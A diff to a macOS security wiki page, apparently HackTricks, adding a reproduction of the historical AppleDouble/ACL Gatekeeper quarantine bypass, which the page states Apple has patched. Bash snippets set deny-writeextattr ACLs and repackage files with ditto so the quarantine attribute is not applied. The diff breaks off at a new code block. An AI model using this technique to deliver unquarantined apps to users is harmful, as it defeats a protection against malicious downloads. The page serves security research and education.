@@ -1,4 +1,4 @@
-# macOS xattr-acls extra stuff
+# AppleDouble ACL Quarantine Bypass Reproduction
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
@@ -7,6 +7,65 @@ This historical proof of concept recreates the AppleDouble/ACL technique used by
 Apple fixed the Gatekeeper bypass in macOS Ventura 13, Monterey 12.6.2, and Big Sur 11.7.2; restoring an ACL on a current Mac does not demonstrate a working Gatekeeper bypass.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 For the quarantine and first-launch checks, see [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+
+## ACL and AppleDouble filesystem behavior
+
+### writeextattr ACL
+
+This ACL prevents from adding `xattrs` to the file
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+**AppleDouble** file format copies a file including its ACEs.
+
+In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+
+Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.<sup>[[1]](#references)</sup>
+
+To replicate this we first need to get the correct acl string:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(Note that even if this works the sandbox write the quarantine xattr before)
+
+## AppleDouble sidecar construction and validation
 
 ```bash
 rm -rf /tmp/test*
